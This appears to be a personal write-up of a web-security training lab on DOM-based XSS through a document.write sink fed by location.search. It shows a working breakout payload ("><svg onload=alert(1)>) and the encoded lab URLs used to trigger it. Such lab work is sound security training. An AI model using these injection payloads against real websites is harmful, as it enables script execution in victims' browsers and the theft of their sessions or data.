Problem: Lab: DOM XSS in document.write sink using source location.search
End result: execute JS in client side to alert a message, but this JS is written inside a DOM element

Analysis:

Step 1:
navigate to: https://0ac200ea03d22d4880df3fa300a400c3.web-security-academy.net/
find the search input and see if the input is getting reflected in the output
check the URL https://0ac200ea03d22d4880df3fa300a400c3.web-security-academy.net/?search=test
observation: the input string is reflected as such in the output

Step 2:
Check if html tags can be injected by searching for <h1>test</h1>
observation: you should not that the search query reflected should be a inside a h1 tag
https://0ac200ea03d22d4880df3fa300a400c3.web-security-academy.net/?search=%3Ch1%3Etest%3C%2Fh1%3E

Step 3:
with the search query add script within an SVG elemnt to execute an alert()
like "><svg onload=alert(1)>
https://0ac200ea03d22d4880df3fa300a400c3.web-security-academy.net/?search=%22%3E%3Csvg+onload%3Dalert%281%29%3E
Observation: you have successfully excuted JS in the client side, this can be used to run dangerous scripts instead of just alert
